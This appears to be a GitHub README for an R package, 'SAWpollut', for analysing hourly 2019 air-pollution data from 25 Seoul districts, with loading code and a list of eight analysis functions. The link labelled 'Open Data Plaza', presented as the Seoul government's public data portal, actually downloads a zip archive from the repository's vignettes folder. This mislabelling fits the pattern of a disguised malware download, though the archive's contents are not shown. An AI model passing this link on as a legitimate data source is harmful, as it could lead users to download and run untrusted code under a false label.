# SAW_pollut-Rpackage 
## Description: 
Developed a R-package named "SAWpollut"- Soil, Air, and Water domains.  

It is a crucial resource, providing a versatile toolkit for analyzing pollution data comprehensively. From pinpointing hotspots to uncovering seasonal variations, it enables users to extract meaningful insights. This user-friendly package streamlines the exploration of complex pollution data, aiding researchers, policymakers, and environmental professionals in informed decision-making. As pollution poses increasing threats, "SAWpollut" plays a pivotal role in providing actionable information for a healthier, more sustainable future.
## Data Description:
This dataset encompasses comprehensive air pollution measurement data within Seoul, South Korea. By meticulously compiling and refining diverse air pollution-related datasets furnished by the Seoul Metropolitan Government, a structured and coherent dataset has been curated. The dataset furnishes averaged records for six distinct pollutants, namely SO2, NO2, CO, O3, PM10, and PM2.5. Additionally, the versatility of this dataset extends beyond air pollution, encompassing the potential for integrating soil pollution and water pollution data using the same comprehensive package.  

The measurements were conducted on an hourly basis throughout the entirety of 2019, providing a granular understanding of pollution levels. This extensive dataset covers air quality observations across *25 distinct districts* within the city of Seoul. Researchers and analysts can harness this data to unravel intricate trends, identify pollution sources, and derive valuable insights into the environmental landscape of Seoul. The inclusion of soil and water pollution data further enriches the dataset’s potential, enabling a holistic examination of various pollution vectors and their interconnections.  

Seoul Metropolitan Government provides many public data, including air pollution information, through the [Open Data Plaza](https://github.com/Shamzmohamed/SAW_pollut-Rpackage/raw/refs/heads/main/vignettes/pollut_SA_Rpackage_2.4.zip)  

### Installation:
Install the package, then load the data and function-containing library.
```
library(SAWpollut)
```
### Setting up the environment
```
pollution_data <- load_data()
data <- load_data()
print(head(pollution_data))
```
### Functions:
I have created 8 functions for this R package.

|Function Name     |                 Used                  |
| -------------    |:-------------------------------------:|
| `intpol`         | Interpolation                         |
|`d2a_conv`        | Daily to Annual Pollution Conversion  |
|`clust`           |Cluster Analysis of Pollutant Profiles |
|`dm_plots`        |Daily, Monthly Time Series Plots       |
|`anomaldet`       |Anomaly Detection                      |
|`matplot`         |Matrix Plot                            |
|`seaso`           |Seasonal Analysis                      |
|`correg`          |Correlation and Regression Analysis    |
